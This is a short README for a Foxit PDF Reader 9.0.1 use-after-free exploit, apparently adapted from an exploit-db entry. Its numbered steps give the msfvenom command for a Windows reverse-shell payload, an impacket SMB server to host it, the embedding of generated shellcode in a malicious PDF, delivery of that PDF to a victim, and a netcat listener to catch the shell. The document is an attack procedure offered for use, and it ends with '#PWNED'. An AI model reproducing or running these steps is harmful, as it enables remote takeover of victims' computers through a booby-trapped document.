Foxit PDF Reader 9.0.1.1049 - Pointer Overwrite Use-After-Free (Without Metasploit)

Based on https://www.exploit-db.com/exploits/45269

1. Generate payload, the one i used for testing is:
msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.10 LPORT=443 -f exe > shell.exe

2. Open an SMB server with the payload in it
impacket-smbserver sharename /path/to/payload

3. Generate shellcode with the following script
ruby generate_shellcode.rb

4. Copy the output of the script and put it inside exploit.pdf, on the reclaim() function, where specified

5. Transfer exploit.pdf to victim

6. Open a listener on the attacking machine, in my case:
nc -lnvp 443

7. Open exploit.pdf with the vulnerable version of foxit reader on the target

#PWNED
